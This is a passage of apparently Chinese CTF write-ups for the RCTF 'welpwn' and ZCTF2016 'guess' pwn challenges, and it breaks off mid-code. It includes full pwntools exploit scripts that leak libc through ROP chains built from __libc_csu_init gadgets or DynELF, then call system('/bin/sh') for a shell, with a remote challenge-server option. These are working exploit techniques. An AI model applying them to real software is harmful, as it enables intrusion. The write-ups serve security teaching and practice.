puts_addr - libc.sym[<span class="string">'puts'</span>]<span class="comment"># 0x6F6A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]<span class="comment"># 0x453A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18CE17</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"binsh_addr:"</span>,hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># \x00截断,main函数的rbp,之前的与现在的相差0x10,覆盖完rbp后,无法返回到rop代码,所以'B'*0x10用于调整rop位置</span></span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">0x10</span> </span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload2) &lt; <span class="number">1024</span>:</span><br><span class="line">        payload2 += rop</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    <span class="comment"># 如果是send(),缓冲区中会有超过1024字节的那部分数据,没有换行符,会与输入的命令进行拼接</span></span><br><span class="line">    io.sendline(payload2) </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。"><a href="#0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。" class="headerlink" title="0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。"></a>0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、构造<code>payload</code>，使其可以覆盖<code>echo()函数</code>的<code>返回地址</code>，返回到构造的<code>ROP chain</code>地址处。ROP chain主要是使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造。执行完ROP chain，使程序返回<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p><p>2、利用分为<code>三个阶段</code>。</p><blockquote><p><code>第一阶段</code>：调用write()函数，<code>泄露</code>程序中使用到的任意<code>库函数的地址</code>。然后根据泄露出的库函数地址，以及所给libc.so，我们可以计算出libc.so的加载基址。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出system()函数的地址以及“/bin/sh\x00”字符串的地址。<br><code>第二阶段</code>：调用read()函数，将计算出的<code>system()</code>函数地址以及<code>“/bin/sh\x00”</code>字符串地址，写到<code>.bss段</code>，以方便下次构造ROP chain。<br><code>第三阶段</code>：调用system(“/bin/sh”)获取shell。</p></blockquote><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：使用__libc_csu_init中的通用gadgets构造ROP</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># echo()中的flag缓冲区,0x10字节。echo()返回地址下面就是main函数中大小为1024字节的缓冲区</span></span><br><span class="line">    <span class="comment"># flag[16],rbp,ret_addr</span></span><br><span class="line">    <span class="comment"># r12 = 'A'*8,r13 = 'A'*8,r14 = 'A'*8,r15 = pop4_r12_ret,ret_addr = pop6_rbx_ret</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = write_got,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = write_got</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,write_got,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>,hex(write_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_offset:"</span>,hex(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">    libc_base_addr = write_addr - libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>,hex(libc_base_addr)</span><br><span class="line">    system_addr = libc_base_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(libc.sym[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret) </span><br><span class="line">    payload2 += p64(pop6_rbx_ret) </span><br><span class="line">    payload2 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(read_got) + p64(<span class="number">0x11</span>) + p64(bss_addr) + p64(<span class="number">0</span>) </span><br><span class="line">    payload2 += p64(mov_rdx_rsi_edi_call) <span class="comment"># read(0,bss_addr,0x11)</span></span><br><span class="line">    payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload2 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>+ p64(system_addr))</span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload3 += p64(pop6_rbx_ret) </span><br><span class="line">    payload3 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr) </span><br><span class="line">    payload3 += p64(mov_rdx_rsi_edi_call) <span class="comment"># system("/bin/sh")</span></span><br><span class="line">    payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload3 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"><a href="#0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。" class="headerlink" title="0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"></a>0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。</h3><p>&emsp;&emsp;使用此方法，编写exp时就比较简单了，因为很多工作都被<code>pwntools</code>封装好了，我们只需要<code>调用一下</code>就可以了。但是，不知道原理怎么行，所以，我决定重新写一篇文章进行<code>DynELF泄露原理</code>的介绍。</p><p>&emsp;&emsp;<code>DynELF</code>是<code>pwntools</code>中专门用来应对<code>没有libc情况</code>的漏洞利用模块，在提供一个<code>目标程序任意地址</code>的情况下，我们需要<code>实现一个函数</code>，此函数可以泄露<code>任意地址</code>的<code>任意数据</code>，现在则可以解析<code>任意加载库</code>的<code>任意符号地址</code>。</p><p><strong><code>模板</code>*</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, enhex(data <span class="keyword">or</span> <span class="string">''</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">'read'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure></p><p><strong><code>利用思路</code></strong>：</p><p>1、编写<code>任意地址</code>泄露<code>任意数据</code>函数。此函数中的payload的<code>ROP chain</code>，我们使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造，通过调用<code>write()</code>函数，泄露<code>任意地址</code>的<code>8字节数据</code>。</p><p>2、通过<code>DynELF</code>中泄露符号地址的函数<code>lookup</code>，泄露<code>system()</code>函数地址和<code>gets()</code>函数地址。</p><p>3、待找到<code>libc</code>中<code>system()</code>函数地址和<code>gets()</code>函数地址，再构造<code>payload</code>，调用<code>gets()</code>函数，将<code>“/bin/sh”</code>写入到<code>“.bss”段</code>，再调用<code>system()</code>函数，获取shell。</p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 方法：未知libc.so版本,使用DynELF()泄露libc.so中的函数地址</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = addr,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = addr</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,addr,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recv(<span class="number">8</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span> + <span class="number">0x1b</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x -&gt; %s"</span> %(addr, (result <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    d = DynELF(leak,elf = ELF(<span class="string">'./welpwn'</span>))</span><br><span class="line">    system_addr = int(d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    gets_addr = int(d.lookup(<span class="string">'gets'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"gets_addr:"</span>,hex(gets_addr)</span><br><span class="line"></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(bss_addr) + p64(gets_addr) </span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">    rop += p64(main_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload += rop</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ZCTF2016——WriteUp(Pwn)</title>
      <link href="/2020/07/05/ZCTF2016%E2%80%94%E2%80%94WriteUp(Pwn)/"/>
      <url>/2020/07/05/ZCTF2016%E2%80%94%E2%80%94WriteUp(Pwn)/</url>
      <content type="html"><![CDATA[<blockquote><p>ZCTF2016 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="guess-pwn100"><a href="#guess-pwn100" class="headerlink" title="guess-pwn100"></a>guess-pwn100</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec guess</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/guess&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有<code>栈溢出</code>，开启了<code>NX(DEP)</code>使<code>堆栈</code>上的代码不可执行。</p><h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;首先，这是一个<code>64位</code>的<code>ELF</code>可执行程序。我们使用<code>IDA</code>反汇编此文件，并用反编译插件得到<code>主函数的伪代码</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> mark; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> current_position; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> input_flag[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span 